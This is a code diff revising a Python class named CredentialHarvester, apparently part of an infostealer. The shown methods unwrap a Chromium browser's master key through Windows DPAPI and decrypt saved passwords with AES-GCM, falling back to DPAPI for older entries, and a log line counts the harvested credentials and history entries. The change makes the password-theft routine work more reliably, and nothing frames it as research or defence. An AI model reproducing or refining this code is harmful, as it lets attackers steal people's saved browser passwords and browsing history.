@@ -342,29 +342,36 @@ class CredentialHarvester:
 
                     print(f"Final browser data collection complete. Credentials: {{len(self.credentials_data)}}, History: {{len(self.history_data)}}")
 
-                def get_master_key(self, path: str) -> str:
+                def get_master_key(self, path: str):
                     try:
-                        with open(path, "r", encoding="utf-8") as f:
-                            c = f.read()
-                        local_state = json.loads(c)
-                        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-                        master_key = master_key[5:]
-                        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-                        return master_key
-                    except Exception:
-                        pass
-
-                def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
+                        with open(path, "r", encoding="utf-8") as f: local_state = json.load(f)
+                        import ctypes; from ctypes import wintypes
+                        class DATA_BLOB(ctypes.Structure): _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
+                        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+                        p_in = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key))
+                        p_out = DATA_BLOB()
+                        if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(p_in), None, None, None, None, 0, ctypes.byref(p_out)):
+                            k = ctypes.string_at(p_out.pbData, p_out.cbData)
+                            ctypes.windll.kernel32.LocalFree(p_out.pbData)
+                            return k
+                        return None
+                    except: return None
+                def decrypt_password(self, buff: bytes, master_key: bytes):
                     try:
-                        iv = buff[3:15]
-                        payload = buff[15:]
-                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
-                        decrypted_pass = cipher.decrypt(payload)
-                        decrypted_pass = decrypted_pass[:-16].decode()
-                        return decrypted_pass
-                    except Exception:
+                        if not buff: return ""
+                        if buff.startswith(b"v10") or buff.startswith(b"v11"):
+                            iv, payload = buff[3:15], buff[15:]
+                            cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                            return cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode(errors="ignore")
+                        import ctypes; from ctypes import wintypes
+                        class DATA_BLOB(ctypes.Structure): _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
+                        p_in = DATA_BLOB(len(buff), ctypes.create_string_buffer(buff)); p_out = DATA_BLOB()
+                        if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(p_in), None, None, None, None, 0, ctypes.byref(p_out)):
+                            v = ctypes.string_at(p_out.pbData, p_out.cbData)
+                            ctypes.windll.kernel32.LocalFree(p_out.pbData)
+                            return v.decode(errors="ignore")
                         return ""
-
+                    except: return ""
                 def _copy_db_to_temp(self, db_path):
                     """Copy database file to temp location to avoid locking issues"""
                     if not os.path.isfile(db_path):
